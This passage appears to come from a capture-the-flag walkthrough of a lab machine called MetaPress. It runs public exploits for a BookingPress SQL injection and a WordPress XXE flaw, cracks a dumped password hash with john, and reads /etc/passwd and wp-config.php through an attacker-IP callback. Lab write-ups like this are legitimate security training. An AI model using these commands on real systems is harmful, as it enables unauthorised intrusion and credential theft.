## 3. BookingPress SQLi (CVE-2022-0739)

BookingPress prior to 1.0.11 has an unauthenticated SQL injection in its AJAX booking handler. No nonce or authentication is validated before the query is constructed.

```bash
wget https://raw.githubusercontent.com/viardant/CVE-2022-0739/main/booking-sqlinjector.py
python3 booking-sqlinjector.py -u http://metapress.htb -nu http://metapress.htb/events/ -v
```

```
[*] Getting nonce
[*] Nonce: <nonce>
[*] Exploiting SQLi
[+] admin:$P$BGrGrgf2wToBS79i07Nj9w/55bbFHh.
[+] manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

Crack the manager hash with john:

```bash
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```
partylikearockstar (manager)
```

Login to WordPress at `/wp-login.php` as `manager:partylikearockstar` succeeds.

## 4. WordPress XXE (CVE-2021-29447)

WordPress 5.6.2 running on PHP 8 processes external XML entities embedded in the metadata of uploaded media files. A crafted WAV file with a DOCTYPE entity triggers an outbound HTTP request that serves a malicious XML payload, which in turn causes WordPress to fetch and return an arbitrary local file.

```bash
git clone https://github.com/Val-Resh/CVE-2021-29447-POC
python3 CVE-2021-29447.py --url http://metapress.htb --server-ip <ATTACKER_IP> -u manager -p 'partylikearockstar'
```

The exploit starts a local HTTP server, uploads the WAV, and intercepts the callback. Targeting `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
...
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
```

`jnelson` is the only user with a login shell. Targeting `../wp-config.php`:

```php
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '<redacted>' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
```

FTP credentials obtained from `wp-config.php`.

